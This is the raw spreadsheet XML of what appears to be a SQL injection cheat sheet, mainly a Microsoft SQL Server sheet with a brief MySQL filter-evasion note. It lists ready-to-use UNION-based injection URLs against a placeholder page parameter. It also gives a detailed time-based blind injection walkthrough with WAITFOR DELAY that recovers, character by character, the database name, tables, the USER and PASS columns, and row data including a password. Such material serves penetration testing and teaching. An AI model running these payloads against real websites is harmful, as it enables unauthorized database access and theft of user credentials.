        <table:table-row table:style-name="ro6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Sometimes alternative names can be used instead (to evade keyword filtering)</text:p>
            <text:p>  The alternate names may depend on a PRIMARY Key being present in the table.</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>information_schema.partitions</text:p>
            <text:p>information_schema.statistics</text:p>
            <text:p>information_schema.key_column_usage</text:p>
            <text:p>information_schema.table_constraints</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1" table:number-rows-repeated="1048346">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
      </table:table>
      <table:table table:name="SQLServer_MSSQL" table:style-name="ta1">
        <table:table-column table:style-name="co6" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co7" table:default-cell-style-name="Default"/>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>1 – Standard SQL injection (not blind)</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Integer injection</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1 UNION SELECT ALL 1--</text:p>
            <text:p>http://[site]/page.asp?id=1 UNION SELECT ALL 1,2--</text:p>
            <text:p>http://[site]/page.asp?id=1 UNION SELECT ALL 1,2,3--</text:p>
            <text:p>http://[site]/page.asp?id=1 UNION SELECT ALL 1,2,3,4--</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract database user</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1 UNION SELECT ALL 1,USER,3,4--</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract Database name</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1 UNION SELECT ALL 1,DB_NAME,3,4--</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract database version</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1 UNION SELECT ALL 1,@@VERSION,3,4--</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract server name</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1 UNION SELECT ALL 1,@@SERVERNAME,3,4--</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract database tables</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1 UNION SELECT ALL 1,name,3,4 from sysobjects where xtype=char(85)--</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract table name</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>1 and 1=2 UNION SELECT 11,22,33,table_name from information_schema.tables--</text:p>
            <text:p>1 and 1=2 UNION SELECT 11,22,33,table_name from information_schema.tables where table_name not in ('threads')--</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract table column names</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1 UNION SELECT ALL 1,column_name,3,4 from DBNAME.information_schema.columns where table_name='TABLE-NAME-1'--</text:p>
            <text:p>1 and 1=2 UNION SELECT 11,22,33,column_name from information_schema.columns where table_name='users'--</text:p>
            <text:p>1 and 1=2 UNION SELECT 11,22,33,column_name from information_schema.columns where table_name='users' and column_name not in ('uname')--</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 1<text:span text:style-name="T5">st</text:span> field</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1 UNION SELECT ALL 1,COLUMN-NAME-1,3,4 from TABLE-NAME-1--</text:p>
            <text:p>1 and 1=2 UNION SELECT 11,22,33,uname from users--</text:p>
            <text:p>1 and 1=2 UNION SELECT 11,22,33,uname from users where uname not in ('admin')--</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro23">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 2<text:span text:style-name="T5">nd</text:span> field</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1 UNION SELECT ALL 1,COLUMN-NAME-2,3,4 from TABLE-NAME-1-- </text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro23">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 3<text:span text:style-name="T5">rd</text:span> field</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1 UNION SELECT ALL 1,COLUMN-NAME-3,3,4 from TABLE-NAME-1--</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>2 – Blind sql injection</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Integer injection</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1; WAITFOR DELAY '00:00:10'-- (+10 seconds) </text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>String injection</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=x'; WAITFOR DELAY '00:00:10'-- (+10 seconds</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro24">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract database user: 3 characters, walkthrough</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>3 - Total Characters </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'-- </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (LEN(USER)=2) WAITFOR DELAY '00:00:10'-- </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (LEN(USER)=3) WAITFOR DELAY '00:00:10'-- (+10 seconds) </text:p>
            <text:p/>
            <text:p>D  - 1st Character </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),1,1)))&gt;97) WAITFOR DELAY '00:00:10'-- (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),1,1)))=98) WAITFOR DELAY '00:00:10'-- </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),1,1)))=99) WAITFOR DELAY '00:00:10'-- </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),1,1)))=100) WAITFOR DELAY '00:00:10'-- (+10 seconds) </text:p>
            <text:p> </text:p>
            <text:p>B - 2nd Character </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),2,1)))&gt;97) WAITFOR DELAY '00:00:10'-- (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),2,1)))=98) WAITFOR DELAY '00:00:10'-- (+10 seconds) </text:p>
            <text:p> </text:p>
            <text:p>O - 3rd Character </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),3,1)))&gt;97) WAITFOR DELAY '00:00:10'-- (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),3,1)))&gt;115) WAITFOR DELAY '00:00:10'-- </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),3,1)))&gt;105) WAITFOR DELAY '00:00:10'-- (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),3,1)))&gt;110) WAITFOR DELAY '00:00:10'-- (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),3,1)))=109) WAITFOR DELAY '00:00:10'-- </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),3,1)))=110) WAITFOR DELAY '00:00:10'-- (+10 seconds)</text:p>
            <text:p>Database User = DBO</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro13">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract database name: PRO-DB-1</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1; IF (LEN(DB_NAME())=8) WAITFOR DELAY '00:00:10'-- (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((DB_NAME()),1,1)))=112) WAITFOR DELAY '00:00:10'-- (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((DB_NAME()),2,1)))=114) WAITFOR DELAY '00:00:10'-- (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((DB_NAME()),3,1)))=111) WAITFOR DELAY '00:00:10'-- (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((DB_NAME()),4,1)))=45) WAITFOR DELAY '00:00:10'-- (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((DB_NAME()),5,1)))=100) WAITFOR DELAY '00:00:10'-- (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((DB_NAME()),6,1)))=98) WAITFOR DELAY '00:00:10'-- (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((DB_NAME()),7,1)))=45) WAITFOR DELAY '00:00:10'-- (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((DB_NAME()),8,1)))=49) WAITFOR DELAY '00:00:10'-- (+10 seconds)</text:p>
            <text:p>Database Name = PRO-DB-1</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro16">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 1<text:span text:style-name="T5">st</text:span> database table: USERS</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1; IF (LEN(SELECT TOP 1 NAME from sysobjects where xtype='U')=5) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85)),1,1)))=117) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85)),2,1)))=115) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85)),3,1)))=101) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85)),4,1)))=114) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85)),5,1)))=115) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>Table Name = USERS</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro12">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 2<text:span text:style-name="T5">nd</text:span> database table: ORDERS</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1; IF (LEN(SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name&gt;'USERS')=6) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name&gt;'USERS'),1,1)))=111) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name&gt;'USERS'),2,1)))=114) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name&gt;'USERS'),3,1)))=100) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name&gt;'USERS'),4,1)))=101) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name&gt;'USERS'),5,1)))=114) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name&gt;'USERS'),6,1)))=115) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>Table Name = ORDERS</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro17">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 3<text:span text:style-name="T5">rd</text:span> database table: CUSTOMERS</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1; IF (LEN(SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name&gt;'ORDERS')=9) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name&gt;'ORDERS'),1,1)))=99) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name&gt;'ORDERS'),2,1)))=117) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name&gt;'ORDERS'),3,1)))=115) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name&gt;'ORDERS'),4,1)))=116) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name&gt;'ORDERS'),5,1)))=111) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name&gt;'ORDERS'),6,1)))=109) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name&gt;'ORDERS'),7,1)))=101) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name&gt;'ORDERS'),8,1)))=114) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85) and name&gt;'ORDERS'),9,1)))=115) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>Table Name = CUSTOMERS</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro18">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 1<text:span text:style-name="T5">st</text:span> table column name: USER</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1; IF (LEN(SELECT TOP 1 column_name from PRO-DB-1.information_schema.columns where table_name='USERS')=4) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from PRO-DB-1.information_schema.columns where table_name='USERS'),1,1)))=117) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from PRO-DB-1.information_schema.columns where table_name='USERS'),2,1)))=115) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from PRO-DB-1.information_schema.columns where table_name='USERS'),3,1)))=101) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from PRO-DB-1.information_schema.columns where table_name='USERS'),4,1)))=114) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>Column Name = USER</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro18">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 2<text:span text:style-name="T5">nd</text:span> table column name: PASS</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1; IF (LEN(SELECT TOP 1 column_name from PRO-DB-1.information_schema.columns where table_name='USERS' and column_name&gt;'USER')=4) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from PRO-DB-1.information_schema.columns where table_name='USERS' and column_name&gt;'USER'),1,1)))=112) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from PRO-DB-1.information_schema.columns where table_name='USERS' and column_name&gt;'USER'),2,1)))=97) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from PRO-DB-1.information_schema.columns where table_name='USERS' and column_name&gt;'USER'),3,1)))=115) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from PRO-DB-1.information_schema.columns where table_name='USERS' and column_name&gt;'USER'),4,1)))=115) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>Column Name = PASS</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 3<text:span text:style-name="T5">rd</text:span> table column name: ID</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1; IF (LEN(SELECT TOP 1 column_name from PRO-DB-1.information_schema.columns where table_name='USERS' and column_name&gt;,'PASS')=2) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from PRO-DB-1.information_schema.columns where table_name='USERS' and column_name&gt;'PASS'),1,1)))=105) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name from PRO-DB-1.information_schema.columns where table_name='USERS' and column_name&gt;'PASS'),2,1)))=100) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>Column Name = ID</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro16">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 1<text:span text:style-name="T5">st</text:span> field of 1<text:span text:style-name="T5">st</text:span> row: ADMIN</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1; IF (LEN(SELECT TOP 1 USER from USERS)=5) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(substring((SELECT TOP 1 USER from USERS),1,1))=97) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(substring((SELECT TOP 1 USER from USERS),2,1))=100) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(substring((SELECT TOP 1 USER from USERS),3,1))=109) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(substring((SELECT TOP 1 USER from USERS),4,1))=105) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(substring((SELECT TOP 1 USER from USERS),5,1))=110) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>Field Data = ADMIN</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro5">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 2<text:span text:style-name="T5">nd</text:span> field of 1<text:span text:style-name="T5">st</text:span> row: 123</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1; IF (LEN(SELECT TOP 1 PASS from USERS)=3) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(substring((SELECT TOP 1 PASS from USERS),1,1))=49) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(substring((SELECT TOP 1 PASS from USERS),2,1))=50) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(substring((SELECT TOP 1 PASS from USERS),3,1))=51) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>Field Data = 123</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro5">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 3<text:span text:style-name="T5">rd</text:span> field of 1<text:span text:style-name="T5">st</text:span> row: 100</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1; IF (LEN(SELECT TOP 1 ID  from USERS)=3) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(substring((SELECT TOP 1 ID  from USERS),1,1))=49) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(substring((SELECT TOP 1 ID  from USERS),2,1))=48) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(substring((SELECT TOP 1 ID  from USERS),3,1))=48) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>Field Data = 100</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro5">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 1<text:span text:style-name="T5">st</text:span> field of 2<text:span text:style-name="T5">nd</text:span> row: Joe</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1; IF (LEN(SELECT TOP 1 USER from USERS where USER NOT in ('ADMIN') order by USERS desc)=3) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 USER from USERS where USER NOT in ('ADMIN') order by USER desc),1,1)))=106) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 USER from USERS where USER NOT in ('ADMIN') order by USER desc),2,1)))=111) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 USER from USERS where USER NOT in ('ADMIN') order by USER desc),3,1)))=101) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>Field Data = JOE</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro5">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract 1<text:span text:style-name="T5">st</text:span> field of 3<text:span text:style-name="T5">rd</text:span> row: JIM</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>http://[site]/page.asp?id=1; IF (LEN(SELECT TOP 1 USER from USERS where USER NOT in ('JOE') order by USERS desc)=3) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 USER from USERS where USER NOT in ('JOE') order by USER desc),1,1)))=106) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 USER from USERS where USER NOT in ('JOE') order by USER desc),2,1)))=105) WAITFOR DELAY '00:00:10'--  (+10 seconds) </text:p>
            <text:p>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 USER from USERS where USER NOT in ('JOE') order by USER desc),3,1)))=109) WAITFOR DELAY '00:00:10'--  (+10 seconds)</text:p>
            <text:p>Field Data = JIM</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro16">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Determine db_name using char by char ASCII</text:p>
            <text:p> same/similar process for all tables/columns/fields</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)&gt;90 –db_name start with ascii &gt; 90? true</text:p>
            <text:p>1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)&gt;120 –db_name start with scii &gt; 120? false</text:p>
            <text:p>1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)&gt;105</text:p>
            <text:p>1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)&gt;112</text:p>
            <text:p>1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)&gt;108 –valid</text:p>
            <text:p>1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)&gt;109 –invalid</text:p>
            <text:p>1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)=109 –db_name start with ascii 109 (m)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro5">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Determine table name using char by char ASCII</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>1 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT TOP 1 LOWER(name) FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 1 LOWER(name) FROM sysObjects WHERE xtYpe=0x55)) AS varchar(8000)),1,1)),0)&gt;97 – first char of first table in database</text:p>
